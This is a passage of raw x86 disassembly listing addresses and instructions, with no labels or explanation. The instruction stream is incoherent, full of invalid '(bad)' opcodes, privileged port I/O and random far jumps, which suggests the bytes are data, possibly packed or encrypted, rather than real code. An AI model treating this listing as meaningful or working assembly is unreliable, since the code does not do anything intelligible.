  41808e:	int3   
  41808f:	retf   0xe27
  418092:	fcmovb st,st(1)
  418094:	dec    edi
  418095:	sub    eax,0xba48b816
  41809a:	icebp  
  41809b:	adc    eax,0x43865682
  4180a0:	push   esp
  4180a1:	ins    DWORD PTR es:[edi],dx
  4180a2:	or     al,0xdf
  4180a4:	ins    BYTE PTR es:[edi],dx
  4180a5:	shr    ebp,0x17
  4180a8:	jmp    0xd1308179
  4180ad:	ret    0xbca1
  4180b0:	std    
  4180b1:	add    DWORD PTR [esi-0x2e],0x51
  4180b5:	dec    edi
  4180b6:	mov    ds:0xa1a4697,eax
  4180bb:	dec    ebx
  4180bc:	out    dx,eax
  4180bd:	sub    WORD PTR [ebp+0x6b88dda0],si
  4180c4:	loope  0x4180d5
  4180c6:	repnz and ecx,edi
  4180c9:	add    al,0x9b
  4180cb:	cld    
  4180cc:	xor    ebx,ebx
  4180ce:	(bad)  
  4180cf:	xor    cl,ah
  4180d1:	in     eax,dx
  4180d2:	lods   al,BYTE PTR ds:[esi]
  4180d3:	dec    edx
  4180d4:	jecxz  0x418106
  4180d6:	bound  esp,QWORD PTR [esi+0x2c]
  4180d9:	test   DWORD PTR [ecx+0x61acba57],0xfc6776af
  4180e3:	jnp    0x4180a9
  4180e5:	jae    0x4180ed
  4180e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e8:	(bad)  
  4180e9:	stos   BYTE PTR es:[edi],al
  4180ea:	loop   0x4180d5
  4180ec:	scas   al,BYTE PTR es:[edi]
  4180ed:	mov    ebx,0x34378856
  4180f2:	daa    
  4180f3:	mov    bl,0x95
  4180f5:	sbb    eax,DWORD PTR ds:0xa06076fa
  4180fb:	loopne 0x418121
  4180fd:	in     al,dx
  4180fe:	mov    ds:0xde8a689b,eax
  418103:	pop    esi
  418104:	lahf   
  418105:	aad    0x38
  418107:	aas    
  418108:	jo     0x4180da
  41810a:	adc    eax,0xf73f8e68
  41810f:	mov    ecx,fs
  418111:	or     dl,BYTE PTR [edi-0x4]
  418114:	xchg   edi,eax
  418115:	out    0x66,ax
  418118:	mov    dl,BYTE PTR [ecx]
  41811a:	ret    
  41811b:	add    BYTE PTR [eax-0x68],dl
  41811e:	ins    DWORD PTR es:[edi],dx
  41811f:	push   ss
  418120:	fstp   DWORD PTR [edi]
  418122:	dec    ebx
  418123:	mov    ds,WORD PTR [edi]
  418125:	and    dh,BYTE PTR [ecx+0x77]
  418128:	ror    BYTE PTR [esi+0x73],1
  41812b:	scas   eax,DWORD PTR es:[edi]
  41812c:	retf   0xdbbb
  41812f:	repz pusha 
  418131:	jno    0x41810b
  418133:	retf   
  418134:	(bad)  
  418135:	in     eax,dx
  418136:	adc    cl,dl
  418138:	stos   BYTE PTR es:[edi],al
  418139:	(bad)  
  41813b:	clc    
  41813c:	cdq    
  41813d:	jge    0x418170
  41813f:	(bad)  
  418140:	jmp    0xb4a63a43
  418145:	dec    esi
  418146:	push   esi
  418147:	mov    esp,0xaf58fab4
  41814c:	xchg   edi,eax
  41814d:	pop    es
  41814e:	dec    ebp
  41814f:	xchg   ebp,eax
  418150:	mov    al,0x8a
  418152:	shl    DWORD PTR [eax],1
  418154:	xchg   ebx,eax
  418155:	cdq    
  418156:	jge    0x41812c
  418158:	push   esp
  418159:	adc    eax,0x8fcf0dda
  41815e:	dec    BYTE PTR [ecx+edx*8]
  418161:	mov    dl,0xa4
  418163:	mov    ebx,0x1aef573f
  418168:	sub    al,0xcb
  41816a:	sbb    ebx,esi
  41816c:	jo     0x4181dd
  41816e:	pop    edx
  41816f:	int3   
  418170:	loope  0x4181a3
  418172:	rcr    BYTE PTR [eax],1
  418174:	mov    esp,0x40a9a1fb
  418179:	mov    esp,0xd197f875
  41817e:	je     0x41811b
  418180:	sub    DWORD PTR [eax+0x65],esi
  418183:	inc    esp
  418184:	out    dx,eax
  418185:	aas    
  418186:	jg     0x418150
  418188:	in     al,0x51
  41818a:	test   esp,ebp
  41818c:	xor    dl,BYTE PTR [esi-0x7574d8b3]
  418192:	popw   es
  418194:	add    edx,ebx
  418196:	cmc    
  418197:	xor    bl,BYTE PTR fs:[eax-0x5e3fd185]
  41819e:	inc    ebx
  41819f:	cdq    
  4181a0:	sti    
  4181a1:	int3   
  4181a2:	mov    ecx,0xaf14f741
  4181a7:	inc    ecx
  4181a8:	mov    WORD PTR [ebx+0x4a],es
  4181ab:	add    ebx,DWORD PTR [ecx]
  4181ad:	loope  0x41819a
  4181af:	push   esp
  4181b0:	push   ecx
  4181b1:	sub    al,0x34
  4181b3:	pop    esp
  4181b4:	push   edi
  4181b5:	push   ecx
  4181b6:	dec    esp
  4181b7:	jae    0x4181f0
  4181b9:	push   ebp
  4181ba:	mov    bh,bh
  4181bc:	pop    ecx
  4181bd:	js     0x418236
  4181bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c0:	jns    0x4181ad
  4181c2:	sahf   
  4181c3:	idiv   DWORD PTR [ecx]
  4181c5:	cwde   
  4181c6:	adc    eax,0x2e5b6c35
  4181cb:	pop    ecx
  4181cc:	pop    eax
  4181cd:	std    
  4181ce:	add    eax,0xe7cf2b9a
  4181d3:	retf   
  4181d4:	push   ebp
  4181d5:	add    dh,BYTE PTR [edx]
  4181d7:	pop    edx
  4181d8:	xor    BYTE PTR [edx-0x8],0xb0
  4181dc:	dec    ebx
  4181dd:	add    al,BYTE PTR [ebx]
  4181df:	fldpi  
  4181e1:	pop    ecx
  4181e2:	ret    
  4181e3:	or     BYTE PTR [ebp+0x20],ch
  4181e6:	dec    edx
  4181e7:	and    DWORD PTR [edx+0x10],edx
  4181ea:	mov    bl,0x96
  4181ec:	and    ecx,ebp
  4181ee:	mov    esi,0x4110546
  4181f3:	test   BYTE PTR [ecx+0xc600cdf],dh
  4181f9:	in     eax,0xa4
  4181fb:	push   edx
  4181fc:	cmp    al,0x7c
  4181fe:	pop    edi
  4181ff:	or     esi,esp
  418201:	test   BYTE PTR [edi],0x13
  418204:	(bad)  
  418206:	or     eax,0x1e390437
  41820b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41820c:	sbb    BYTE PTR [ebx],0x33
  41820f:	pop    ebp
  418210:	add    edx,DWORD PTR [eax]
  418212:	fisubr DWORD PTR [eax]
  418214:	repz cwde 
  418216:	aas    
  418217:	xchg   esp,edx
  418219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821a:	stc    
  41821b:	xor    BYTE PTR [edx+0x5056a92],ah
  418221:	stos   BYTE PTR es:[edi],al
  418222:	ret    0xd96
  418225:	fcmovb st,st(0)
  418227:	out    0x3f,eax
  418229:	popf   
  41822a:	sub    ax,0x7864
  41822e:	mov    BYTE PTR [esi-0x10],ch
  418231:	ds pop esi
  418233:	pop    ecx
  418234:	pop    eax
  418235:	outs   dx,DWORD PTR ds:[esi]
  418236:	scas   eax,DWORD PTR es:[edi]
  418237:	inc    esp
  418238:	add    edi,0x13
  41823b:	in     al,0xfe
  41823d:	stc    
  41823e:	fisubr WORD PTR [ebx+ebx*4]
  418241:	in     al,dx
  418242:	jns    0x41821f
  418244:	loop   0x418203
  418246:	dec    ebx
  418247:	mov    bl,0x6
  418249:	loopne 0x4182ae
  41824b:	lock inc esi
  41824d:	adc    sp,dx
  418250:	add    al,0xe0
  418252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418253:	push   ebx
  418254:	cdq    
  418255:	sar    ecx,0xe
  418258:	xchg   ebp,eax
  418259:	sbb    eax,0x3dd3ca4d
  41825e:	in     eax,0xc2
  418260:	cmc    
  418261:	mov    bh,0xdb
  418263:	push   0xffffffad
  418265:	xchg   edi,eax
  418266:	pop    ss
  418267:	push   ss
  418268:	imul   ebp,DWORD PTR [ebp+0x5190cddd],0x7c
  41826f:	fmul   DWORD PTR [ecx+0x1ac2abad]
  418275:	mov    esp,0x854a4019
  41827a:	and    eax,0x9647514f
  41827f:	mov    eax,DWORD PTR [ebx+ebx*4]
  418282:	sub    BYTE PTR [esi-0x702b0c56],dl
  418288:	lock pop bp
  41828b:	mov    ebx,0x20cee2f5
  418290:	adc    BYTE PTR [ecx-0x3bcf5244],bl
  418296:	enter  0x71ff,0x45
  41829a:	(bad)  
  41829c:	cmp    dl,ch
  41829e:	out    0x2a,eax
  4182a0:	mov    WORD PTR [edx+0x3c0490ee],?
  4182a6:	add    eax,eax
  4182a8:	ret    0xc10b
  4182ab:	addr16 js 0x4182cc
  4182ae:	ret    
  4182af:	jmp    0x418241
  4182b1:	cmp    ecx,DWORD PTR [edx+0x7d]
  4182b4:	in     al,0xf8
  4182b6:	adc    ecx,DWORD PTR [ebp+0x41117a21]
  4182bc:	jmp    0x87ac:0xa068e012
  4182c3:	(bad)  
  4182c4:	mov    al,ds:0x5709bbd6
  4182c9:	sbb    DWORD PTR [edi+0x13ecdb55],0xc75f0f12
  4182d3:	sar    BYTE PTR [edx],1
  4182d5:	imul   edi,ecx,0x6d5ad269
  4182db:	(bad)  
  4182dc:	cmp    BYTE PTR [ebp-0x38],ah
  4182df:	test   al,ah
  4182e1:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e3:	in     eax,0x27
  4182e5:	outs   dx,DWORD PTR ds:[esi]
  4182e6:	push   0x7f
  4182e8:	push   ds
  4182e9:	in     eax,dx
  4182ea:	xchg   ebx,eax
  4182eb:	je     0x4182c5
  4182ed:	add    dh,ch
  4182ef:	out    0x4e,al
  4182f1:	mov    eax,0xfa2c9641
  4182f6:	cmp    DWORD PTR [ebx+0x4c1d604f],0xffffff98
  4182fd:	nop
  4182fe:	sub    DWORD PTR [ebp+0x7c1541da],edx
  418304:	lea    edx,[ecx+0x4609c11d]
  41830a:	lods   eax,DWORD PTR ds:[esi]
  41830b:	stos   BYTE PTR es:[edi],al
  41830c:	sbb    ecx,DWORD PTR [ecx]
  41830e:	in     al,0x81
  418310:	dec    ebx
  418311:	pop    edi
  418312:	arpl   dx,dx
  418314:	add    BYTE PTR [eax+0x76d8f4f4],cl
  41831a:	jmp    0x356a:0x6bb822d
  418321:	(bad)  
  418322:	cli    
  418323:	fsub   QWORD PTR ds:0x3ac851e1
  418329:	rcl    edx,1
  41832b:	leave  
  41832c:	aam    0xe
  41832e:	sbb    eax,0x1c580d1f
  418333:	fild   WORD PTR [eax-0x65]
  418336:	pushf  
  418337:	ds pusha 
  418339:	and    al,0xa2
  41833b:	call   0xcab68e31
  418340:	and    ch,dh
  418342:	xor    eax,0x279bf3c9
  418347:	adc    DWORD PTR [ebx],esi
  418349:	ins    DWORD PTR es:[edi],dx
  41834a:	loope  0x4182da
  41834c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834e:	es dec esp
  418350:	pop    es
  418351:	gs mov eax,0x85814377
  418357:	cld    
  418358:	cmp    edx,DWORD PTR [esi-0x4522f27c]
  41835e:	or     ecx,DWORD PTR [ebx+edi*4-0x6a]
  418362:	mov    edx,0xf810877b
  418367:	sar    ecx,0x2
  41836a:	out    0xf9,eax
  41836c:	and    BYTE PTR [esi-0x29],0x1b
  418370:	pop    es
  418371:	add    eax,0x6e0574f2
  418376:	lea    esp,[edx-0x15cbd287]
  41837c:	xor    eax,0xca317949
  418381:	jmp    0xd36a:0xfb9226d4
  418388:	shl    DWORD PTR [eax-0x150ff474],cl
  41838e:	test   eax,0x6dc1eaf1
  418393:	(bad)  
  418394:	mov    ch,0x5e
  418396:	into   
  418397:	push   es
  418398:	cld    
  418399:	cwde   
  41839a:	arpl   WORD PTR [esi-0x55acb7a9],bx
  4183a0:	ja     0x418335
  4183a2:	test   BYTE PTR [eax-0x1],al
  4183a5:	jnp    0x41833a
  4183a7:	mov    dh,0x7a
  4183a9:	add    DWORD PTR [edi-0x576e2f6d],esp
  4183af:	cdq    
  4183b0:	pop    edi
  4183b1:	cdq    
  4183b2:	add    al,0x58
  4183b4:	aaa    
  4183b5:	jg     0x418399
  4183b7:	and    BYTE PTR [edx],cl
  4183b9:	mov    gs,WORD PTR [edi+0x537ce44d]
  4183bf:	push   ecx
  4183c0:	xlat   BYTE PTR ds:[ebx]
  4183c1:	cmp    BYTE PTR [ebx+0x2d02b2f6],cl
  4183c7:	pop    ds
  4183c8:	jg     0x41837f
  4183ca:	cs dec esp
  4183cc:	(bad)  
  4183cd:	aam    0x2a
  4183cf:	bound  ebx,QWORD PTR [edx-0x27]
  4183d2:	ret    0x4efc
  4183d5:	xchg   edx,eax
  4183d6:	mov    ebp,0x2a4837cf
  4183db:	pop    ss
  4183dc:	sbb    esp,DWORD PTR cs:[esi-0x659d9b21]
  4183e3:	mov    ch,0x78
  4183e5:	std    
  4183e6:	scas   eax,DWORD PTR es:[edi]
  4183e7:	xchg   esp,eax
  4183e8:	pop    edx
  4183e9:	xor    bh,BYTE PTR [edx+0x656285ef]
  4183ef:	call   0x73f2c53f
  4183f4:	out    dx,eax
  4183f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183f6:	arpl   WORD PTR [edx+0x12e7e6df],ax
  4183fc:	fcom   DWORD PTR es:[edi+0x753f00c5]
  418403:	sbb    bh,ch
  418405:	sub    DWORD PTR [eax+0x2bf0a03],ebx
  41840b:	retf   
  41840c:	cmp    cl,bl
  41840e:	lods   al,BYTE PTR ds:[esi]
  41840f:	int    0xa0
  418411:	ret    
  418412:	std    
  418413:	rcr    ebx,cl
  418415:	loope  0x418423
  418417:	or     eax,edi
  418419:	mov    bh,0x4e
  41841b:	jns    0x418451
  41841d:	loop   0x418494
  41841f:	dec    edi
  418420:	loop   0x4183d5
  418422:	in     eax,0x4b
  418424:	jmp    0x397f42c
  418429:	xor    dh,BYTE PTR ds:0xf48bfe57
  41842f:	xchg   ecx,eax
  418430:	lds    ecx,FWORD PTR [eax-0x2]
  418433:	jecxz  0x418462
  418435:	in     al,dx
  418436:	xor    al,cl
  418438:	jl     0x418432
  41843a:	inc    ebx
  41843b:	mov    WORD PTR [ebp+0x3da8750a],fs
  418441:	push   es
  418442:	sub    eax,eax
  418444:	adc    al,0x60
  418446:	jbe    0x41842d
  418448:	mov    ebx,0x729f402f
  41844d:	cdq    
  41844e:	fnsetpm(287 only) 
  418450:	mov    ebx,0xa1e72b9
  418455:	push   edx
  418456:	pop    ebp
  418457:	xchg   edx,eax
  418458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418459:	and    BYTE PTR [ebp-0x7f],0x77
  41845d:	jmp    0x418417
  41845f:	or     DWORD PTR [edi],ecx
  418461:	(bad)  
  418462:	jl     0x4184d5
  418464:	adc    BYTE PTR [ebp-0x482c9737],bl
  41846a:	jmp    0x41843a
  41846c:	popf   
  41846d:	jle    0x4184c0
  41846f:	stos   BYTE PTR es:[edi],al
  418470:	xor    BYTE PTR [edi],0xfa
  418473:	leave  
  418474:	cs (bad) 
  418476:	sub    eax,0x91a1e742
  41847b:	add    al,0xd9
  41847d:	cmp    eax,0xd53440bc
  418482:	fsubrp st(4),st
  418484:	mov    cl,0xe1
  418486:	cmp    ebx,esi
  418488:	ja     0x418428
  41848a:	lods   al,BYTE PTR ds:[esi]
  41848b:	jge    0x418458
  41848d:	dec    ecx
  41848e:	inc    esp
  41848f:	jae    0x4184e2
  418491:	add    eax,0xc7ef70ee
  418496:	shl    ch,0x31
  418499:	pop    ss
  41849a:	pop    ebx
  41849b:	dec    esi
  41849c:	mov    al,ds:0x8c1c2d64
  4184a1:	pop    ds
  4184a2:	sbb    BYTE PTR [edx],al
  4184a4:	sti    
  4184a5:	push   edi
  4184a6:	cmc    
  4184a7:	es push es
  4184a9:	xor    al,0x8d
  4184ab:	push   es
  4184ac:	out    0xd3,al
  4184ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184af:	popf   
  4184b0:	out    0x4e,eax
  4184b2:	mov    dh,0x81
  4184b4:	sub    WORD PTR [edi+0x4b],di
  4184b8:	pushf  
  4184b9:	pop    es
  4184ba:	fmul   DWORD PTR [ecx+esi*8+0x3e1f8955]
  4184c1:	popa   
  4184c2:	push   ebx
  4184c3:	add    al,0x70
  4184c5:	pop    edx
  4184c6:	mov    bl,0x12
  4184c8:	outs   dx,DWORD PTR ds:[esi]
  4184c9:	xchg   ebx,eax
  4184ca:	fsub   st,st(6)
  4184cc:	daa    
  4184cd:	hlt    
  4184ce:	sbb    al,0xeb
  4184d0:	xchg   DWORD PTR [edx+0x66],edx
  4184d3:	jmp    0x4184c8
  4184d5:	mov    dl,0xab
  4184d7:	pop    edx
  4184d8:	sbb    edi,DWORD PTR [esi-0x5e]
  4184db:	not    ah
  4184dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184de:	psubb  mm1,QWORD PTR ds:0x83d06d07
  4184e5:	sub    eax,0x35df01ab
  4184ea:	mov    cl,0xf
  4184ec:	shl    BYTE PTR [ecx+0xeb4c472],1
  4184f2:	mov    edi,0x5e21eb91
  4184f7:	cmp    ecx,DWORD PTR [ecx]
  4184f9:	out    dx,eax
  4184fa:	and    al,0xdf
  4184fc:	cld    
  4184fd:	rcr    DWORD PTR [edx-0x19],0x50
  418501:	sub    BYTE PTR [ebx-0x58],al
  418504:	mov    esp,0xcf2b144a
  418509:	inc    ebp
  41850a:	fsubp  st(5),st
  41850c:	jl     0x418589
  41850e:	mov    dl,0x44
  418510:	int3   
  418511:	sbb    eax,0x770f957f
  418516:	pop    ebp
  418517:	mov    dl,0x4e
  418519:	mov    ds,eax
  41851b:	(bad)  
  41851c:	lods   al,BYTE PTR ds:[esi]
  41851d:	push   DWORD PTR [ebx+edi*2-0x51d9dc35]
  418524:	xor    al,0xa2
  418526:	popa   
  418527:	sub    ebx,ebx
  418529:	jnp    0x41853e
  41852b:	das    
  41852c:	mov    bl,0xc6
  41852e:	jb     0x418593
  418530:	fcom   DWORD PTR [eax-0x4e0357d8]
  418536:	inc    sp
  418538:	fs mov bh,0xb7
  41853b:	pop    esp
  41853c:	fst    QWORD PTR [ecx]
  41853e:	faddp  st(2),st
  418540:	retf   
  418541:	cli    
  418542:	pop    esp
  418543:	and    edi,DWORD PTR [esi+ebx*2+0x65]
  418547:	xor    eax,0xe003b489
  41854c:	lods   al,BYTE PTR ds:[esi]
  41854d:	add    dh,cl
  41854f:	inc    edi
  418550:	bound  ebx,QWORD PTR [ecx+0x5b]
  418553:	fs pop es
  418555:	sub    BYTE PTR [edi-0x5a0d486],bh
  41855b:	mov    ebp,0xbbf5d2a8
  418560:	and    al,0xda
  418562:	mov    edi,ebx
  418564:	sbb    cl,al
  418566:	mov    eax,0x5a6ab2f6
  41856b:	mov    BYTE PTR ds:0xa1181fe3,bl
  418571:	fdivr  QWORD PTR [edx]
  418573:	out    dx,al
  418574:	lods   eax,DWORD PTR ds:[esi]
  418575:	pop    edx
  418576:	scas   eax,DWORD PTR es:[edi]
  418577:	jae    0x418576
  418579:	mov    ah,0x43
  41857b:	ins    BYTE PTR es:[edi],dx
  41857c:	int3   
  41857d:	adc    BYTE PTR [edi+0x79],bh
  418580:	adc    BYTE PTR [ebp+0x2c],dl
  418583:	pop    esp
  418584:	inc    edi
  418585:	xor    dh,ch
  418587:	pop    esp
  418588:	jmp    0x3b1d6132
  41858d:	imul   esi,DWORD PTR [esi],0x47
  418590:	lock fisubr DWORD PTR [edx+eax*2-0x5cc56164]
  418598:	sahf   
  418599:	dec    eax
  41859a:	xlat   BYTE PTR ds:[ebx]
  41859b:	inc    ebx
  41859c:	pop    edx
  41859d:	fld    DWORD PTR [edx+0x4278319c]
  4185a3:	dec    esp
  4185a4:	or     eax,0x48e077b5
  4185a9:	shl    BYTE PTR [edx+ebx*2+0x662f6d4],cl
  4185b0:	fcmovne st,st(1)
  4185b2:	int    0x7e
  4185b4:	cmp    eax,DWORD PTR [eax+0x1a]
  4185b7:	mov    bl,ah
  4185b9:	xor    DWORD PTR [ecx],eax
  4185bb:	add    ecx,DWORD PTR [eax]
  4185bd:	jmp    0xee8c647a
  4185c2:	sub    cl,BYTE PTR [ecx-0x45]
  4185c5:	fst    DWORD PTR [eax+0x10]
  4185c8:	gs icebp 
  4185ca:	es mov bl,0xf2
  4185cd:	or     cl,cl
  4185cf:	mov    bh,0x6c
  4185d1:	inc    edi
  4185d2:	scas   eax,DWORD PTR es:[edi]
  4185d3:	xor    al,0x2f
  4185d5:	call   DWORD PTR [edi-0x2b]
  4185d8:	dec    eax
  4185d9:	pop    es
  4185da:	outs   dx,DWORD PTR ds:[esi]
  4185db:	cs enter 0x2766,0x96
  4185e0:	add    dh,BYTE PTR [esi-0x4cb2a4bb]
  4185e6:	retf   
  4185e7:	push   ebp
  4185e8:	mul    BYTE PTR [esi+0x6085b4fb]
  4185ee:	dec    esi
  4185ef:	or     eax,0x397f0a56
  4185f4:	neg    DWORD PTR [esi-0x6e]
  4185f7:	push   es
  4185f8:	mov    ecx,0xf0e6ea4a
  4185fd:	and    eax,0x829a3bb8
  418602:	pop    esp
  418603:	or     DWORD PTR [edi+0x2ff2d8bc],0x46
  41860a:	adc    al,0x11
  41860c:	lods   eax,DWORD PTR ds:[esi]
  41860d:	rcr    DWORD PTR [ecx-0x5f],1
  418610:	jle    0x4185b1
  418612:	call   0x94969f40
  418617:	cmp    esp,DWORD PTR [ebp+0x6d]
  41861a:	sbb    eax,0x4d049ef1
  41861f:	pop    esi
  418620:	nop
  418621:	jp     0x4185ec
  418623:	dec    eax
  418624:	mov    eax,0x7f23de1c
  418629:	(bad)  
  41862a:	in     al,dx
  41862b:	fucomi st,st(7)
  41862d:	paddq  mm4,QWORD PTR [ebx-0x7b42ecb3]
  418634:	test   DWORD PTR [edx],ebx
  418636:	(bad)  
  418637:	cmova  ebx,DWORD PTR [eax-0x681974f4]
  41863e:	sub    eax,esp
  418640:	xchg   ecx,eax
  418641:	cs push cs
  418643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418644:	stc    
  418645:	(bad)  
  418646:	jg     0x4185cd
  418648:	mov    ds:0x12063fbc,eax
  41864d:	nop
  41864e:	sbb    ebp,0x5add4139
  418654:	test   dl,cl
  418656:	loop   0x4185ec
  418658:	in     al,0x2
  41865a:	cmovo  ebx,DWORD PTR [edi-0x59]
  41865e:	mov    al,ds:0x677f7521
  418663:	ss mov edi,0x9575afa1
  418669:	and    edi,edx
  41866b:	dec    esp
  41866c:	sbb    eax,0x4e009e8c
  418671:	dec    ecx
  418672:	or     dl,al
  418674:	pop    ss
  418675:	and    DWORD PTR [edx],esi
  418677:	cli    
  418678:	cmp    DWORD PTR [edx+esi*2+0x542aca73],edi
  41867f:	lea    esp,es:[esi]
  418682:	inc    eax
  418683:	imul   ebp,DWORD PTR [esi+0x27fecce7],0x5e3fa97a
  41868d:	sub    DWORD PTR [edx+esi*2],ecx
  418690:	jo     0x418689
  418692:	inc    ebp
  418693:	push   esp
  418694:	in     eax,dx
  418695:	in     eax,0x84
  418697:	pop    ss
  418698:	inc    edi
  418699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41869a:	xchg   edx,eax
  41869b:	out    dx,al
  41869c:	arpl   dx,dx
  41869e:	out    dx,al
  41869f:	pop    edx
  4186a0:	test   ebp,edx
  4186a2:	scas   al,BYTE PTR es:[edi]
  4186a3:	cmp    eax,0xf2873ce3
  4186a8:	mov    bl,0xee
  4186aa:	fxch   st(4)
  4186ac:	xchg   esi,eax
  4186ad:	sti    
  4186ae:	jns    0x418648
  4186b0:	xor    esi,esi
  4186b2:	pop    eax
  4186b3:	(bad)  
  4186b4:	xchg   ecx,eax
  4186b5:	add    DWORD PTR [esi+0x79],esp
  4186b8:	mov    ebx,0x994eef9a
  4186bd:	mov    ds:0x87d0f415,eax
  4186c2:	sub    bl,BYTE PTR [ecx-0x7a]
  4186c5:	es adc al,0x3
  4186c8:	call   0xec0629ad
  4186cd:	in     al,dx
  4186ce:	je     0x4186d8
  4186d0:	loopne 0x418696
  4186d2:	xor    ebp,esi
  4186d4:	int3   
  4186d5:	not    BYTE PTR [ebx+0x4699e83a]
  4186db:	repnz mov WORD PTR [edx-0x4695e340],cs
  4186e2:	stc    
  4186e3:	in     eax,dx
  4186e4:	enter  0x4564,0xcc
  4186e8:	pop    es
  4186e9:	adc    BYTE PTR [edx-0x75],dl
  4186ec:	and    ebp,DWORD PTR [ebp+0x671570f]
  4186f2:	sbb    al,0x91
  4186f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186f5:	jle    0x418715
  4186f7:	leave  
  4186f8:	sahf   
  4186f9:	nop
  4186fa:	cdq    
  4186fb:	int3   
  4186fc:	sbb    BYTE PTR [ecx-0x63bac8e6],0xd8
  418703:	loopne 0x418772
  418705:	test   eax,0xb401e61
  41870a:	xor    dl,al
  41870c:	jnp    0x418784
  41870e:	push   cs
  41870f:	lods   al,BYTE PTR ds:[esi]
  418710:	push   cs
  418711:	hlt    
  418712:	cli    
  418713:	sub    eax,0xb41bdb8d
  418718:	and    al,0xfc
  41871a:	sub    BYTE PTR [edi+eiz*8+0x4f540180],al
  418721:	jbe    0x4186cf
  418723:	(bad)  
  418724:	jg     0x418784
  418726:	into   
  418727:	mov    ebp,DWORD PTR [eax+0x4e]
  41872a:	scas   eax,DWORD PTR es:[edi]
  41872b:	loopne 0x41871c
  41872d:	and    esi,DWORD PTR [eax+0x5b]
  418730:	mov    DWORD PTR [edi+0x4a21f4e6],0xed5d2f1a
  41873a:	aad    0xfc
  41873c:	xchg   ebx,eax
  41873d:	push   0x7d
  41873f:	mov    esi,DWORD PTR [esi-0x3c]
  418742:	imul   DWORD PTR [ebx+0x78]
  418745:	pop    edi
  418746:	enter  0x7e48,0x8a
  41874a:	test   al,0x16
  41874c:	rcr    BYTE PTR [esi],cl
  41874e:	jmp    0x6574:0x4e987ff9
  418755:	jnp    0x41876a
  418757:	xor    BYTE PTR [ebx-0x60e08679],ah
  41875d:	push   ss
  41875e:	dec    edx
  41875f:	or     DWORD PTR [ebx],0x194f2c14
  418765:	mov    BYTE PTR [edx-0x2d5298d7],bh
  41876b:	out    dx,eax
  41876c:	or     bh,BYTE PTR [esi+0x5e]
  41876f:	fidivr DWORD PTR [edx-0x74]
  418772:	movups XMMWORD PTR ds:0xa90ddbbf,xmm0
  418779:	sahf   
  41877a:	cmp    al,0xf8
  41877c:	daa    
  41877d:	jno    0x418773
  41877f:	outs   dx,BYTE PTR ds:[esi]
  418780:	leave  
  418781:	adc    al,0x53
  418783:	hlt    
  418784:	pushf  
  418785:	xchg   ecx,eax
  418786:	add    cl,dh
  418788:	int    0xf9
  41878a:	pusha  
  41878b:	jae    0x41878e
  41878d:	and    al,0xbb
  41878f:	add    eax,0x9201c03a
  418794:	xor    edi,ebp
  418796:	cs icebp 
  418798:	add    al,dl
  41879a:	retf   
  41879b:	mov    edi,0x2fde9cb6
  4187a0:	mov    ecx,0x6a00785b
  4187a5:	je     0x418778
  4187a7:	sbb    eax,DWORD PTR [edi]
  4187a9:	iret   
  4187aa:	cli    
  4187ab:	pusha  
  4187ac:	push   ecx
  4187ad:	cmp    BYTE PTR [ecx+0x57053ac0],0x18
  4187b4:	rol    DWORD PTR [edi],cl
  4187b6:	inc    eax
  4187b7:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4187b9:	mov    BYTE PTR [edi],ah
  4187bb:	fild   WORD PTR [edx+edi*2]
  4187be:	xlat   BYTE PTR ds:[ebx]
  4187bf:	pop    eax
  4187c0:	jp     0x4187f0
  4187c2:	push   eax
  4187c3:	(bad)
  4187c7:	lahf   
  4187c8:	lods   eax,DWORD PTR ds:[esi]
  4187c9:	test   DWORD PTR [edi-0x3aaafd79],esp
  4187cf:	mov    edi,0x33e8ac2f
  4187d4:	fild   QWORD PTR [ecx+0x1527288b]
  4187da:	xchg   esp,eax
  4187db:	fadd   QWORD PTR [esi+0x33]
  4187de:	dec    ebp
  4187df:	fidivr WORD PTR [eax]
  4187e1:	ffreep st(7)
  4187e3:	and    ah,al
  4187e5:	out    dx,eax
  4187e6:	ret    
  4187e7:	add    al,0x2c
  4187e9:	daa    
  4187ea:	mov    ebp,0x9653f907
  4187ef:	clc    
  4187f0:	mov    ds:0xe3503543,eax
  4187f5:	push   eax
  4187f6:	sub    eax,0xe931656b
  4187fb:	add    bl,BYTE PTR [eax+0x75]
  4187fe:	stos   DWORD PTR es:[edi],eax
  4187ff:	xchg   ecx,eax
  418800:	inc    edi
  418801:	mov    eax,ds:0x942b3619
  418806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418807:	cmp    al,0xb1
  418809:	xlat   BYTE PTR ds:[ebx]
  41880a:	cwd    
  41880c:	scas   eax,DWORD PTR es:[edi]
  41880d:	dec    edi
  41880e:	mov    BYTE PTR [esi+ebx*4-0x1b2356d3],al
  418815:	les    eax,FWORD PTR [eax+ebx*2]
  418818:	xor    BYTE PTR [ecx],ah
  41881a:	(bad)  
  41881b:	mov    ch,0xe0
  41881d:	(bad)  
  41881e:	jge    0x4187e0
  418820:	mov    ebp,0x47b2417b
  418825:	mov    eax,ds:0xd2c89159
  41882a:	jp     0x418814
  41882c:	ror    edi,1
  41882e:	mov    ah,0xbb
  418830:	scas   al,BYTE PTR es:[edi]
  418831:	pop    edi
  418832:	dec    ecx
  418833:	ja     0x41885e
  418835:	jo     0x418882
  418837:	jg     0x4187d4
  418839:	es das 
  41883b:	stos   DWORD PTR es:[edi],eax
  41883c:	lock push ds
  41883e:	push   ebx
  41883f:	push   0xffffffb6
  418841:	sbb    BYTE PTR [ecx-0x3e],0x6c
  418845:	and    eax,0x4765cb82
  41884a:	sbb    DWORD PTR [ecx],esi
  41884c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41884d:	ret    0x2567
